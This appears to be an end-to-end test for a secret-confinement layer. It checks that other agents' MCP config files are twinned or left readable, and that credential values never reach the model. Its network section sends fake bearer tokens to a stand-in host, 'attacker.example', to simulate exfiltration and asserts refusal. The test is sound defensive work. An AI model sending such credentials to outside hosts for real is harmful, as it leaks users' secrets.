/**
 * mcp-config-agents e2e — the other agents' and tools' MCP configs in the
 * default catalog (secret-discovery.md §2.10, "The other agents' and tools'
 * configs", 2026-10-22): OpenCode's `opencode.json` (global and project),
 * Goose's `config.yaml`, Gemini CLI's `settings.json`, Zed's
 * `settings.json`, Continue's `config.yaml`, and a Codex `config.toml` that
 * `CODEX_HOME` moved out of `.codex`.
 *
 * Before: none of these was read as an MCP config. OpenCode's, Goose's and
 * Zed's sat in the content tier's agent-config exclusion, Gemini CLI's was
 * read only for its secret-named keys, and a moved Codex config only for
 * its secret-named keys (and, in a dot directory of HOME, labelled by the
 * content tier in every launch, so twinned under `mandu codex` too). A
 * model that read one ("fix my MCP setup") sent a stdio server's token
 * under a plain variable name, or an HTTP server's bearer, to its
 * provider.
 *
 * The REAL components, no agent and no model: a real ArbiterServer in
 * `secrets` (with its human socket, where the launcher's registrations
 * earn their wire grants); the launcher's PRODUCTION secret setup
 * (`applySecretTwins` over `socketSecretArbiter`) for `mandu opencode`,
 * `mandu goose`, `mandu codex` with a moved `CODEX_HOME` and `mandu claude`;
 * the PRODUCTION model-proxy wiring (`new ArbiterClientAdapter(new
 * ArbiterClient(sock))`) in front of a mock upstream; and per session the
 * REAL net-proxy the way a launch starts it, its service hosts routed to a
 * counting loopback upstream.
 *
 * Asserted:
 *   1. per launch, the agent's own configs are registered and LEFT READABLE
 *      (OpenCode's global and project `opencode.json` under opencode,
 *      Goose's `config.yaml` under goose, the moved `config.toml` under
 *      codex): a stdio server spawned from the config the agent reads gets
 *      the REAL value; every other config is twinned (Gemini CLI's, Zed's
 *      and Continue's in every launch), and the twin holds no value;
 *   2. an HTTP server's Authorization credential reaches its own host only:
 *      the agent's raw header in its own session (OpenCode's, Goose's), and
 *      the placeholder of Gemini CLI's HOME config put back at the host its
 *      entry names, refused elsewhere; a stdio server's own token reaches
 *      its service in its agent's session and trips in another;
 *   3. a model-bound read of every config (the raw file, a command naming
 *      it, the twin) carries no byte of any value, only `$MDU:`
 *      placeholders;
 *   4. fail-closed: with the arbiter gone, a Read of the raw config does not
 *      reach the model raw, and the launch's secret setup refuses.
 *
 * Axes explicit: secrets (confidentiality ON, integrity OFF).
 *
 * Mandu-new test (no reference origin).
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { createServer, request as httpRequest, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { AnthropicProxy } from "../../interceptors/anthropic-proxy/src/proxy.js";
import { ArbiterClientAdapter } from "../../interceptors/anthropic-proxy/src/arbiter-client.js";
import { MockUpstream, buildTextSse } from "../../interceptors/anthropic-proxy/test/helpers/mock-upstream.js";
import { applySecretTwins, socketSecretArbiter, SecretConfinementError, type SecretSetupResult } from "../../launcher/src/secret-setup.js";
import { emptyMutation } from "../../launcher/src/backend/types.js";
import { startNetProxy } from "../../launcher/src/services/net-proxy.js";
import { realDeps } from "../../launcher/src/services/primitives.js";
import { Layout } from "../../launcher/src/services/layout.js";
import type { LaunchPlan } from "../../launcher/src/types.js";
import { stateAxes } from "../lib/axes.js";

stateAxes("secrets"); // confidentiality ON, integrity OFF: the default mode

const REPO = resolve(fileURLToPath(new URL("../..", import.meta.url)));

// Fake values, each a credential by its shape, built by concatenation.
const OC_GH = "ghp_" + "MCPE2EopencodeGlobal" + "0123456789abcd";          // ~/.config/opencode/opencode.json, local environment
const OC_AUTH = "oca_" + "MCPE2EopencodeRemote" + "Bearer0123456789";        // the same, remote Authorization
const OC_PROJ = "BSA" + "mcpE2EopencodeProject" + "Key7x9Q2wZ5";             // ws/opencode.json, local environment
const GOOSE_GH = "ghp_" + "MCPE2EgooseExtension" + "0123456789ef";          // ~/.config/goose/config.yaml, envs
const GOOSE_AUTH = "gsa_" + "MCPE2EgooseStreamable" + "Bearer01234567";     // the same, headers.Authorization
const GEM_AUTH = "gma_" + "MCPE2EgeminiHttpBearer" + "0123456789AB";        // ~/.gemini/settings.json, headers.Authorization
const GEM_KEY = "gmk_" + "MCPE2EgeminiStdioKey" + "0123456789CD";           // the same, env
const ZED_ENV = "zde_" + "MCPE2EzedContextServer" + "0123456789EF";         // ~/.config/zed/settings.json, env
const CON_ENV = "cne_" + "MCPE2EcontinueStdio" + "Token0123456789GH";       // ~/.continue/config.yaml, env
const CX_GH = "ghp_" + "MCPE2EcodexHomeMoved" + "0123456789ij";             // $CODEX_HOME/config.toml, inline env
const ALL = [OC_GH, OC_AUTH, OC_PROJ, GOOSE_GH, GOOSE_AUTH, GEM_AUTH, GEM_KEY, ZED_ENV, CON_ENV, CX_GH];

const HOSTS = ["mcp.opencode-example.test", "mcp.goose-example.test", "mcp.gemini-example.test", "api.github.com", "attacker.example"];

const json = (v: unknown): string => `${JSON.stringify(v, null, 2)}\n`;
const FILES: Record<string, string> = {
  "~/.config/opencode/opencode.json": json({
    $schema: "https://opencode.ai/config.json",
    mcp: {
      github: { type: "local", command: ["npx", "-y", "@modelcontextprotocol/server-github"], environment: { GITHUB_PERSONAL_ACCESS_TOKEN: OC_GH } },
      remote: { type: "remote", url: "https://mcp.opencode-example.test/mcp", headers: { Authorization: `Bearer ${OC_AUTH}` } },
      ref: { type: "local", command: ["node", "s.js"], environment: { API_KEY: "{env:MY_API_KEY}" } },
    },
  }),
  "ws/opencode.json": json({ mcp: { brave: { type: "local", command: ["npx", "-y", "@brave/brave-search-mcp-server"], environment: { BRAVE_API_KEY: OC_PROJ } } } }),
  "~/.config/goose/config.yaml": [
    "GOOSE_PROVIDER: anthropic",
    "extensions:",
    "  github:",
    "    cmd: npx",
    "    args:",
    "    - -y",
    "    - '@modelcontextprotocol/server-github'",
    "    envs:",
    `      GITHUB_PERSONAL_ACCESS_TOKEN: ${GOOSE_GH}`,
    "    env_keys: []",
    "    type: stdio",
    "  remote:",
    "    headers:",
    `      Authorization: Bearer ${GOOSE_AUTH}`,
    "    type: streamable_http",
    "    uri: https://mcp.goose-example.test/mcp",
    "",
  ].join("\n"),
  // Plain-HTTP server URL: the put-back below runs on the net-proxy's plain
  // leg (an https URL's credential is put back over https only).
  "~/.gemini/settings.json": json({
    mcpServers: {
      remote: { url: "http://mcp.gemini-example.test/mcp", headers: { Authorization: `Bearer ${GEM_AUTH}` } },
      local: { command: "npx", args: ["-y", "s"], env: { SERVICE_KEY: GEM_KEY, LOG_LEVEL: "$LOG_LEVEL" } },
    },
  }),
  "~/.config/zed/settings.json": `// Zed\n{\n  "context_servers": {\n    "local": { "command": "x", "args": [], "env": { "SERVICE_TOKEN": "${ZED_ENV}" } },\n  },\n}\n`,
  "~/.continue/config.yaml": `name: c\nversion: 1.0.0\nschema: v1\nmcpServers:\n  - name: s\n    command: uvx\n    env:\n      SERVICE_TOKEN: ${CON_ENV}\n      GH: \${{ secrets.GH }}\n`,
  "cx/config.toml": ['model = "o3"', "", "[mcp_servers.github]", 'command = "npx"', `env = { GITHUB_PERSONAL_ACCESS_TOKEN = "${CX_GH}" }`, ""].join("\n"),
};

/** Claude Code's Read output: numbered lines. */
const claudeRead = (text: string): string => text.replace(/\n$/, "").split("\n").map((l, i) => `${String(i + 1).padStart(6)}\t${l}`).join("\n");

function post(port: number, body: string, session: string): Promise<{ status: number; body: string }> {
  return new Promise((done, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: "/v1/messages", headers: { "content-type": "application/json", "x-mandu-session-id": session } },
      (res) => {
        let buf = "";
        res.setEncoding("utf8");
        res.on("data", (c) => (buf += c));
        res.on("end", () => done({ status: res.statusCode ?? 0, body: buf }));
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}

function turn(input: { file_path: string } | { command: string }, content: string, id: string): string {
  return JSON.stringify({
    model: "claude-sonnet-5",
    stream: true,
    messages: [
      { role: "user", content: "fix my MCP setup" },
      { role: "assistant", content: [{ type: "tool_use", id, name: "file_path" in input ? "Read" : "Bash", input }] },
      { role: "user", content: [{ type: "tool_result", tool_use_id: id, content }] },
    ],
  });
}

/** One request through a session's net-proxy (plain HTTP, absolute URL). */
function send(proxyPort: number, url: string, opts: { auth?: string; body?: string }): Promise<{ status: number; body: string }> {
  return new Promise((done, reject) => {
    const u = new URL(url);
    const body = opts.body ?? "";
    const r = httpRequest(
      {
        host: "127.0.0.1", port: proxyPort, method: body ? "POST" : "GET", path: url,
        headers: { host: u.host, "content-type": "application/json", "content-length": Buffer.byteLength(body), ...(opts.auth ? { authorization: opts.auth } : {}) },
      },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => done({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
      },
    );
    r.on("error", reject);
    r.end(body);
  });
}

/** What a stdio MCP server spawned with `env` holds in `name`: its sha256
 *  (the child never prints the value). */
function serverSees(env: Record<string, string>, name: string): string {
  const r = spawnSync(process.execPath, ["-e", `process.stdout.write(require("node:crypto").createHash("sha256").update(process.env[${JSON.stringify(name)}] ?? "").digest("hex"))`], {
    env: { PATH: process.env["PATH"] ?? "", ...env }, encoding: "utf8",
  });
  assert.equal(r.status, 0, r.stderr);
  return r.stdout;
}
const sha = (v: string): string => createHash("sha256").update(v).digest("hex");

/** Goose's `envs` of one extension, as Goose reads them from its config. */
function gooseEnvs(text: string, ext: string): Record<string, string> {
  const out: Record<string, string> = {};
  const block = text.split(`\n  ${ext}:\n`)[1]?.split(/\n  [a-z]/)[0] ?? "";
  const envs = block.split("\n    envs:\n")[1] ?? "";
  for (const line of envs.split("\n")) {
    const m = /^ {6}([A-Z_]+): (.+)$/.exec(line);
    if (m === null) break;
    out[m[1]!] = m[2]!;
  }
  return out;
}

test("other agents' MCP configs: OpenCode's and Goose's own left readable (their servers get the real values), a moved Codex config too, every other twinned, no value at the model, each credential only at its own host, fail-closed", { timeout: 300_000 }, async () => {
  const tmp = realpathSync(mkdtempSync(join(tmpdir(), "mdu-mcp-agents-")));
  const home = join(tmp, "home");
  const ws = join(tmp, "ws");
  mkdirSync(home, { recursive: true });
  mkdirSync(ws, { recursive: true });
  const at = (rel: string): string => (rel.startsWith("~/") ? join(home, rel.slice(2)) : join(tmp, rel));
  for (const [rel, text] of Object.entries(FILES)) {
    mkdirSync(dirname(at(rel)), { recursive: true });
    writeFileSync(at(rel), text, { mode: 0o600 });
  }
  const codexHome = at("cx");
  const P = {
    opencode: at("~/.config/opencode/opencode.json"), opencodeProject: at("ws/opencode.json"), goose: at("~/.config/goose/config.yaml"),
    gemini: at("~/.gemini/settings.json"), zed: at("~/.config/zed/settings.json"), continue: at("~/.continue/config.yaml"), codexMoved: at("cx/config.toml"),
  };

  // The counting upstream standing in for every service host.
  const seen: string[] = [];
  const upstream: Server = createServer((req, res) => {
    let b = "";
    req.on("data", (c) => (b += c));
    req.on("end", () => { seen.push(`${(req.headers.host ?? "").replace(/:\d+$/, "")} ${req.headers.authorization ?? ""} ${b}`); res.writeHead(200, { "content-type": "text/plain" }); res.end("ok"); });
  });
  await new Promise<void>((r) => upstream.listen(0, "127.0.0.1", r));
  const up = (upstream.address() as AddressInfo).port;
  const routes = join(tmp, "routes.yaml");
  writeFileSync(routes, "hosts:\n" + HOSTS.map((h) => `  - host: "${h}"\n    to: "127.0.0.1:${up}"\n`).join(""));

  const sock = join(tmp, "arbiter.sock");
  const humanSock = join(tmp, "human", "h.sock");
  mkdirSync(join(tmp, "human"), { mode: 0o700 });
  const server = new ArbiterServer({
    socketPath: sock, adminSocketPath: join(tmp, "admin.sock"), humanSocketPath: humanSock,
    dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), log: () => {},
    confidentiality: true, integrity: false, policyPollMs: 0,
  });
  await server.listen();
  const client = new ArbiterClient(sock);
  await client.connect();

  const planFor = (target: string, scopeId: string): LaunchPlan => ({
    target, argv: [target], scopeId, tenant: "test", arbiterSock: sock,
    arbiterSockMode: "pinned" as const, arbiterRuntimeBase: tmp, eventDir: join(tmp, "events"), cwd: ws, humanCwd: ws,
    noContextProxy: true, fsSync: false, basePath: "/usr/bin",
    proxy: { host: "127.0.0.1", port: 0 }, openaiProxy: { host: "127.0.0.1", port: 0 }, openaiProviderName: "mandu", noProxyExtra: [],
    requested: { netProxy: true, netProxyMitm: false, execWrap: false }, execWrapCmds: [],
    ullm: { mode: "api" as const, baseUrl: "https://api.anthropic.com" }, noScope: true, writeMcp: true, bestEffort: false, replyFilter: false,
    confidentiality: true, effectiveAxes: { confidentiality: true, integrity: false },
    arbiterHumanSock: humanSock, mockSitesPath: routes,
  } as unknown as LaunchPlan);
  const opencodePlan = planFor("opencode", "mcp-agents-opencode");
  const goosePlan = planFor("goose", "mcp-agents-goose");
  const codexPlan = planFor("codex", "mcp-agents-codex");
  const claudePlan = planFor("claude", "mcp-agents-claude");

  const saved = { port: process.env["MANDU_NET_PROXY_PORT"], raw: process.env["MANDU_OTHER_AGENT_LOGINS"], cx: process.env["CODEX_HOME"] };
  delete process.env["MANDU_NET_PROXY_PORT"];
  delete process.env["MANDU_OTHER_AGENT_LOGINS"];
  delete process.env["CODEX_HOME"];
  const stops: Array<() => void> = [];
  const proxies: AnthropicProxy[] = [];
  let n = 0;
  const secretSetup = async (plan: LaunchPlan, extraEnv: Record<string, string> = {}, arbiterSock = sock): Promise<{ res: SecretSetupResult; logs: string[] }> => {
    const runDir = join(tmp, `run-${n++}`);
    mkdirSync(runDir);
    const logs: string[] = [];
    const res = await applySecretTwins(plan, runDir, emptyMutation(), {
      arbiter: socketSecretArbiter(arbiterSock, { humanSock, requestTimeoutMs: 5_000 }), commandExists: () => true, usernsOk: () => true, platform: "linux", log: (m) => logs.push(m),
      home, workspaceRoots: [ws], onWsl: false, nestingOk: () => true, wrapBwrap: "bwrap", guardServesTwins: true,
      symlinkProbe: (bwrap) => ({ bwrap, verdict: "unknown" }), env: { MANDU_HOME: join(tmp, "mandu-home"), ...extraEnv }, makeHome: () => {}, accountHome: null,
    });
    return { res, logs };
  };
  const netProxy = async (plan: LaunchPlan): Promise<number> => {
    const runDir = join(tmp, `np-${n++}`);
    mkdirSync(runDir);
    const r = await startNetProxy(plan, Layout.dev(REPO), runDir, { ...realDeps, home });
    stops.push(r.stop);
    return r.netProxy.port;
  };
  const sessionKey = `mcp-agents-${process.pid}`;
  const forwarded = async (input: { file_path: string } | { command: string }, content: string): Promise<string> => {
    const mock = new MockUpstream({ sse: buildTextSse("ok") });
    const proxy = new AnthropicProxy({ arbiter: new ArbiterClientAdapter(new ArbiterClient(sock)), upstream: mock.fetcher, sessionKey, log: () => {} });
    proxies.push(proxy);
    const r = await post(await proxy.listen(0), turn(input, content, `tu_${n++}`), sessionKey);
    const b: unknown = mock.requests[mock.requests.length - 1]?.body;
    const sent = b === undefined ? "" : Buffer.isBuffer(b) ? b.toString("utf8") : String(b);
    return `${r.status} ${sent}`;
  };
  const leaked = (text: string): string[] => ALL.filter((v) => text.includes(v));
  const twins = new Map<string, string>();
  const keepTwins = (r: SecretSetupResult): void => { for (const c of r.confined) twins.set(c.path, c.twin ?? c.symbol); };
  const assertTwinsClean = (r: SecretSetupResult): void => {
    for (const c of r.confined) {
      const twin = c.twin ?? c.symbol;
      assert.deepEqual(leaked(twin), [], `CONFIDENTIALITY: ${c.path}'s twin holds no value:\n${twin}`);
    }
  };

  try {
    assert.equal((await client.setSessionSpec({ sessionKey, spec: "claude-code", requestedBy: "mcp-config-agents e2e" })).bound, "claude-code");

    // ── 1. the launch postures ───────────────────────────────────────────
    const oc = await secretSetup(opencodePlan);
    const ocConfined = new Set(oc.res.confined.map((c) => c.path));
    for (const own of [P.opencode, P.opencodeProject]) {
      assert.ok(!ocConfined.has(own), `mandu opencode leaves ${own} readable`);
      assert.ok(oc.logs.some((l) => l.includes(own) && /OpenCode's MCP config: left readable to it/.test(l)), `${own}:\n${oc.logs.join("\n")}`);
    }
    for (const p of [P.goose, P.gemini, P.zed, P.continue]) assert.ok(ocConfined.has(p), `mandu opencode twins ${p}: ${oc.logs.join("\n")}`);
    assertTwinsClean(oc.res);
    keepTwins(oc.res);
    // OpenCode reads its own config raw and spawns its local servers with it.
    const ocEnv = (path: string, server: string): Record<string, string> => (JSON.parse(readFileSync(path, "utf8")) as { mcp: Record<string, { environment: Record<string, string> }> }).mcp[server]!.environment;
    assert.equal(serverSees(ocEnv(P.opencode, "github"), "GITHUB_PERSONAL_ACCESS_TOKEN"), sha(OC_GH), "a local server spawned from the global opencode.json gets the real value");
    assert.equal(serverSees(ocEnv(P.opencodeProject, "brave"), "BRAVE_API_KEY"), sha(OC_PROJ), "and from the project's");

    const gs = await secretSetup(goosePlan);
    const gsConfined = new Set(gs.res.confined.map((c) => c.path));
    assert.ok(!gsConfined.has(P.goose), "mandu goose leaves its config.yaml readable");
    assert.ok(gs.logs.some((l) => l.includes(P.goose) && /Goose's MCP config: left readable to it/.test(l)), gs.logs.join("\n"));
    for (const p of [P.opencode, P.opencodeProject, P.gemini, P.zed, P.continue]) assert.ok(gsConfined.has(p), `mandu goose twins ${p}`);
    assertTwinsClean(gs.res);
    keepTwins(gs.res);
    assert.equal(serverSees(gooseEnvs(readFileSync(P.goose, "utf8"), "github"), "GITHUB_PERSONAL_ACCESS_TOKEN"), sha(GOOSE_GH), "Goose's stdio extension gets the real value");
    // A server spawned from a twin would get a placeholder: why the agent's
    // own config is left readable to it.
    const twinGoose = gooseEnvs(twins.get(P.goose) ?? "", "github");
    assert.match(twinGoose["GITHUB_PERSONAL_ACCESS_TOKEN"] ?? "", /^\$MDU:nomodel_/, `the twin's value is a placeholder:\n${twins.get(P.goose)}`);

    const cx = await secretSetup(codexPlan, { CODEX_HOME: codexHome });
    assert.ok(!cx.res.confined.some((c) => c.path === P.codexMoved), "mandu codex leaves the config.toml CODEX_HOME moved readable");
    assert.ok(cx.logs.some((l) => l.includes(P.codexMoved) && /Codex's MCP config: left readable to it/.test(l)), cx.logs.join("\n"));
    assertTwinsClean(cx.res);
    const cl = await secretSetup(claudePlan, { CODEX_HOME: codexHome });
    const clConfined = new Set(cl.res.confined.map((c) => c.path));
    for (const p of Object.values(P)) assert.ok(clConfined.has(p), `mandu claude twins ${p}`);
    assertTwinsClean(cl.res);
    keepTwins(cl.res);

    // ── 2. the network ───────────────────────────────────────────────────
    const ocPort = await netProxy(opencodePlan);
    const gsPort = await netProxy(goosePlan);
    const url = (host: string, path = "/mcp"): string => `http://${host}:${up}${path}`;
    const expectStatus = async (port: number, u: string, opts: { auth?: string; body?: string }, status: number, why: string): Promise<void> => {
      const r = await send(port, u, opts);
      assert.equal(r.status, status, `${why}: ${r.body}`);
      if (status !== 200) assert.deepEqual(leaked(r.body), [], "a refusal names no value");
    };
    await expectStatus(ocPort, url("mcp.opencode-example.test"), { auth: `Bearer ${OC_AUTH}`, body: "{}" }, 200, "OpenCode's remote bearer at its own host, in its own session");
    await expectStatus(ocPort, url("attacker.example", "/a"), { auth: `Bearer ${OC_AUTH}`, body: "{}" }, 403, "the same bearer to another host");
    await expectStatus(ocPort, url("api.github.com", "/user"), { auth: `token ${OC_GH}` }, 200, "OpenCode's local server's own token, in its session");
    await expectStatus(ocPort, url("mcp.goose-example.test"), { auth: `Bearer ${GOOSE_AUTH}`, body: "{}" }, 403, "Goose's bearer in an opencode session");
    await expectStatus(gsPort, url("mcp.goose-example.test"), { auth: `Bearer ${GOOSE_AUTH}`, body: "{}" }, 200, "Goose's streamable bearer at its own host, in its own session");
    await expectStatus(gsPort, url("attacker.example", "/b"), { auth: `Bearer ${GOOSE_AUTH}`, body: "{}" }, 403, "the same bearer to another host");
    await expectStatus(gsPort, url("api.github.com", "/user"), { auth: `token ${GOOSE_GH}` }, 200, "Goose's stdio extension's own token, in its session");
    await expectStatus(gsPort, url("api.github.com", "/user"), { auth: `token ${OC_GH}` }, 403, "OpenCode's server's token in a goose session");
    // Gemini CLI's HOME config: no supported agent reads it, so a program
    // reading its twin sends the placeholder, put back at the entry's host
    // in the Authorization header only, and nowhere else.
    const gemTwin = JSON.parse(twins.get(P.gemini)!) as { mcpServers: { remote: { headers: { Authorization: string } }; local: { env: Record<string, string> } } };
    const placeholder = gemTwin.mcpServers.remote.headers.Authorization;
    assert.match(placeholder, /^\$MDU:nomodel_Read\[/, "the twin holds the Authorization credential's placeholder");
    assert.equal(gemTwin.mcpServers.local.env["LOG_LEVEL"], "$LOG_LEVEL", "a reference is kept as written");
    const before = seen.length;
    await expectStatus(ocPort, url("mcp.gemini-example.test"), { auth: placeholder, body: "{}" }, 200, "the placeholder at its own host");
    assert.ok(seen.slice(before).some((s) => s.startsWith("mcp.gemini-example.test ") && s.includes(`Bearer ${GEM_AUTH}`)), `the host received the real credential: ${seen.slice(before).join("\n")}`);
    await expectStatus(ocPort, url("attacker.example", "/c"), { auth: placeholder, body: "{}" }, 403, "the placeholder to another host");
    await expectStatus(ocPort, url("mcp.gemini-example.test", "/publish"), { body: JSON.stringify({ note: placeholder }) }, 403, "the placeholder in a body");

    // ── 3. what reaches the model ────────────────────────────────────────
    for (const [name, path] of Object.entries(P)) {
      const raw = readFileSync(path, "utf8");
      const cmdName = path.startsWith(home) ? `~${path.slice(home.length)}` : path;
      for (const [input, content] of [
        [{ file_path: path }, claudeRead(raw)],
        [{ command: `cat ${cmdName}` }, raw],
        ...(twins.has(path) ? [[{ file_path: path }, claudeRead(twins.get(path)!)] as const] : []),
      ] as const) {
        const sent = await forwarded(input, content);
        assert.deepEqual(leaked(sent), [], `CONFIDENTIALITY VIOLATION: ${name} reached the model through ${JSON.stringify(input)}:\n${sent.slice(0, 2500)}`);
        assert.match(sent, /\$MDU:nomodel_/, `${name}: the model sees a placeholder through ${JSON.stringify(input)}`);
      }
    }
    for (const v of ALL) assert.ok((await client.scanSecretValues(`printed: ${v}`)).hits.length > 0, `the value backstop knows ${v.slice(0, 8)}…`);
    // After the masked reads (rows of their own holding the raw config), the
    // agent's own servers still reach their services, and only there.
    await expectStatus(ocPort, url("mcp.opencode-example.test"), { auth: `Bearer ${OC_AUTH}`, body: "{}" }, 200, "after the model read opencode.json, its remote bearer at its own host");
    await expectStatus(ocPort, url("attacker.example", "/d"), { auth: `Bearer ${OC_AUTH}`, body: "{}" }, 403, "but not at another");

    // THE ORACLE: no request to the attacker host reached it.
    assert.ok(!seen.some((s) => s.startsWith("attacker.example ")), seen.join("\n"));

    // ── 4. fail-closed: the arbiter gone ─────────────────────────────────
    for (const s of stops.splice(0)) s();
    client.close();
    await server.close();
    const gone = await forwarded({ file_path: P.opencode }, claudeRead(readFileSync(P.opencode, "utf8")));
    assert.deepEqual(leaked(gone), [], `CONFIDENTIALITY VIOLATION: with the arbiter gone, opencode.json reached the model raw:\n${gone.slice(0, 1500)}`);
    await assert.rejects(secretSetup(opencodePlan), SecretConfinementError, "the launch refuses when the arbiter cannot register the configs");
  } finally {
    for (const s of stops) s();
    for (const p of proxies) await p.close().catch(() => {});
    if (saved.port === undefined) delete process.env["MANDU_NET_PROXY_PORT"]; else process.env["MANDU_NET_PROXY_PORT"] = saved.port;
    if (saved.raw === undefined) delete process.env["MANDU_OTHER_AGENT_LOGINS"]; else process.env["MANDU_OTHER_AGENT_LOGINS"] = saved.raw;
    if (saved.cx === undefined) delete process.env["CODEX_HOME"]; else process.env["CODEX_HOME"] = saved.cx;
    client.close();
    await server.close().catch(() => {});
    upstream.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
